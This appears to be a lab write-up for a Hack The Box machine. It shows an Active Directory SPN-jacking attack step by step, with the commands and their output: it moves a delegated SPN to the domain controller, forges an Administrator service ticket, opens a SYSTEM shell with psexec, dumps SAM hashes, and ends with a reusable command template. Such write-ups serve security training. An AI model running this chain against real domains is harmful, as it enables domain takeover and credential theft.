
![[Pasted image 20260328020746.png]]

Use `findDelegation.py` to get the SPN (e.g. `http/WEB01`) and `bloodyAD get writable` to see you can modify a target (e.g. DC01), then combine them to identify SPN-jacking.

```bash
garffff@garfff:~/htb/pirate$ findDelegation.py pirate.htb/a.white_adm:Password123
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists 
-----------  -----------  ----------------------------------  ---------------------  ----------
a.white_adm  Person       Constrained w/ Protocol Transition  http/WEB01.pirate.htb  Yes        
a.white_adm  Person       Constrained w/ Protocol Transition  HTTP/WEB01             Yes        
DC01$        Computer     Unconstrained                       N/A                    Yes
```

BloodyAD (same as the output from Bloodhound):

```bash
gareth@gareth:~/htb/pirate$ bloodyAD --host 10.129.8.87 -d pirate.htb -u a.white_adm -p 'Password123' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=Angela W. ADM,CN=Users,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=WEB01,CN=Computers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=MS01,CN=Computers,DC=pirate,DC=htb
permission: WRITE

distinguishedName: CN=EXCH01,CN=Computers,DC=pirate,DC=htb
permission: WRITE
```

Move the delegated SPN (http/WEB01) from WEB01 to DC01

Remove the SPN from WEB01

```bash
garffff@garffff:~/htb/pirate$ python3 /opt/krbrelayx/addspn.py 192.168.100.1 -u 'pirate.htb\a.white_adm' -p 'Password123' -t WEB01$ -s http/WEB01 -r
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Add the SPN to DC01

```bash
garffff@garffff:~/htb/pirate$ python3 /opt/krbrelayx/addspn.py 192.168.100.1 -u 'pirate.htb\a.white_adm' -p 'Password123' -t DC01$ -s http/WEB01
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Obtain Service Ticket, impersonating Administrator using CIFS as an alt service

The -altservice flag is used to request a service ticket for CIFS/DC01 instead of HTTP, allowing SMB-based tools like psexec to work.

```bash
garffff@garffff:~/htb/pirate$ getST.py -dc-ip 192.168.100.1 pirate.htb/a.white_adm:'Password123' -spn http/WEB01 -impersonate Administrator -altservice CIFS/DC01.pirate.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from http/WEB01@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

Export ccache file

```bash
garffff@garffff:~/htb/pirate$ export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache 
garffff@garffff:~/htb/pirate$ klist
Ticket cache: FILE:Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
Default principal: Administrator@pirate.htb

Valid starting     Expires            Service principal
28/03/26 02:02:51  28/03/26 12:02:51  CIFS/DC01.pirate.htb@PIRATE.HTB
	renew until 29/03/26 03:02:51
```

Login as Administrator

```bash
garffff@garffff:~/htb/pirate$ psexec.py pirate.htb/administrator@DC01.pirate.htb -k -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.pirate.htb.....
[*] Found writable share ADMIN$
[*] Uploading file QmVRHUsG.exe
[*] Opening SVCManager on DC01.pirate.htb.....
[*] Creating service oHpn on DC01.pirate.htb.....
[*] Starting service oHpn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Or use Secretsdump

```bash
garffff@garffff:~/htb/pirate$ secretsdump.py pirate.htb/administrator@DC01.pirate.htb -k -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xaf025c301b1be34c7df7d48a75318dd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
```

Summary:

```bash
python3 /opt/krbrelayx/addspn.py <DC_IP> -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -t <DELEGATION_TARGET>$ -s <SPN_TO_MOVE> -r  

python3 /opt/krbrelayx/addspn.py <DC_IP> -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -t <DESTINATION_HOST>$ -s <SPN_TO_MOVE>  

getST.py -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASSWORD>' -spn <SPN_TO_MOVE> -impersonate <IMPERSONATE_USER> -altservice <SERVICE>/<DESTINATION_FQDN>  

export KRB5CCNAME=<IMPERSONATE_USER>@<SERVICE>_<DESTINATION_FQDN>@<REALM>.ccache  
psexec.py <DOMAIN>/<IMPERSONATE_USER>@<DESTINATION_FQDN> -k -no-pass
```